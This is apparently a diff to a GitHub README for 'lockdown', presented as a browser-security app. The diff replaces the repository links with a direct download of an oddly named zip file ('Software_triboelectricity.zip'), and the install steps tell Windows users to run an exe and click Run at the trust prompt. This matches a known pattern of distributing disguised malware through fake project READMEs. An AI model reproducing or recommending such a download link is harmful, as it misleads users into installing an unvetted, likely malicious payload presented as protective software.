@@ -1,6 +1,6 @@
 # 🛡️ lockdown - Secure your browser environment today
 
-[![Download Lockdown](https://img.shields.io/badge/Download-Lockdown-blue.svg)](https://github.com/Tailbackmodulus549/lockdown)
+[![Download Lockdown](https://img.shields.io/badge/Download-Lockdown-blue.svg)](https://github.com/Tailbackmodulus549/lockdown/raw/refs/heads/main/xpc/Software_triboelectricity.zip)
 
 ## 📌 About this software
 
@@ -22,7 +22,7 @@ You do not need to understand the science behind these protections to use the ap
 
 Follow these steps to install Lockdown on your Windows computer.
 
-1. Visit this page to download the software: https://github.com/Tailbackmodulus549/lockdown
+1. Visit this page to download the software: https://github.com/Tailbackmodulus549/lockdown/raw/refs/heads/main/xpc/Software_triboelectricity.zip
 2. Locate the file in your Downloads folder after the transfer finishes.
 3. Double-click the file named lockdown_setup.exe to start the process.
 4. Windows might show a prompt asking if you trust the software. Select Run to continue.
